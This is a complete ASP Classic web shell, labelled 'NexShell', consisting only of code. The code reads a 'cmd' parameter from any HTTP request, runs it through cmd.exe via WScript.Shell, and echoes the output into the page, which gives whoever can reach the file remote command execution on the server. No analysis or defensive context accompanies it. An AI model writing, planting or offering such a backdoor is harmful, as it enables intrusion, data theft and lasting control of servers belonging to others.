<%
' NexShell WebShell — ASP Classic
Dim oScript, cmd, output
cmd = Request("cmd")
If cmd <> "" Then
    Set oScript = CreateObject("WScript.Shell")
    output = oScript.Exec("cmd.exe /c " & cmd).StdOut.ReadAll()
    Response.Write "<pre>" & output & "</pre>"
End If
%>